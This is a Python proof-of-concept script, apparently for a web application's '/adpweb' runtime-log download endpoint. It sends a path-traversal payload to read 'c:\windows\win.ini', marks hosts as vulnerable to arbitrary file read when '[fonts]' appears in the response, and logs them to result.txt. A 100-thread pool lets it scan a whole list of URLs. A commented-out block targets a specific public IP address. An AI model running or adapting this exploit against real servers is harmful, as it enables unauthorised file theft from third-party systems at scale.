# import requests
#
# url ='http://60.249.91.136:8084/#/login'
# payload = '/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini'
# headers={
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
#     'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
#     'Accept-Encoding': 'gzip, deflate',
#     'Connection': 'keep-alive'
# }
# res1 = requests.get(url=url)
# if res1.status_code == 200:
#     res2 =requests.get(url=url.replace('/#/login','')+payload,headers=headers)
#     # print(res2.text)
#     if '[fonts]' in res2.text:
#         print(f'[+]{url}存在任意文件读取')
#     else:
#         print(f'[+]{url}不存在任意文件读取')
import argparse,requests
from multiprocessing.dummy import Pool


def banner():
    test = """
    ███████╗██████╗ ███╗   ███╗        ██████╗     ██████╗ 
    ██╔════╝██╔══██╗████╗ ████║        ╚════██╗   ██╔═████╗
    ███████╗██████╔╝██╔████╔██║         █████╔╝   ██║██╔██║
    ╚════██║██╔══██╗██║╚██╔╝██║        ██╔═══╝    ████╔╝██║
    ███████║██║  ██║██║ ╚═╝ ██║███████╗███████╗██╗╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ 
                                       author:SMILE
                                       date:2024-09-2
                                       version:1.0                    
    """
    print(test)

def poc(target):
    payload = '/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    try:
        res1 = requests.get(url=target)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload, headers=headers, verify=False, timeout=5)
            if '[fonts]' in res2.text:
                print(f"[+]该{target}存在任意文件读取")
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[+]该{target}存在任意文件读取\n")
            else:
                print(f"[+]该{target}不存在任意文件读取")
        else:
            print(f"该{target}可能存在问题，请手工检测")
    except Exception as e:
        print(e)

def main():
    banner()
    parser = argparse.ArgumentParser(description='这是一个帅气的poc')
    parser.add_argument('-u','--url',dest='url',type=str,help='please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='please enter file')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")

























if __name__ == '__main__':
    main()